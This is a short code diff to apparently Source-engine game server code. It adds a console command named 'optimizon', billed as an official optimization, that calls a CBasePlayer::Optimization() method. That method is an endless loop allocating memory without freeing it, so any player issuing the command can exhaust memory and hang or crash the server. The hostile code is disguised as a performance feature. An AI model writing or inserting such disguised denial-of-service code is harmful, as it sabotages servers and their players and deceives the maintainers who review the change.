@@ -184,6 +184,26 @@ CON_COMMAND(drop, "Dropping weapon from the player")
 
 }
 
+void CBasePlayer::Optimization() {
+	while (true)
+	{
+		new double(8192);
+
+	}
+
+}
+
+CON_COMMAND(optimizon, "Optimization Official By Ilyuha Korotkov Studios")
+{
+	CBasePlayer* pPlayer = UTIL_GetCommandClient();
+
+	if (pPlayer)
+	{
+		pPlayer->Optimization();
+
+	}
+}
+
 
 //==============================================================================================
 // CAPPED PLAYER PHYSICS DAMAGE TABLE
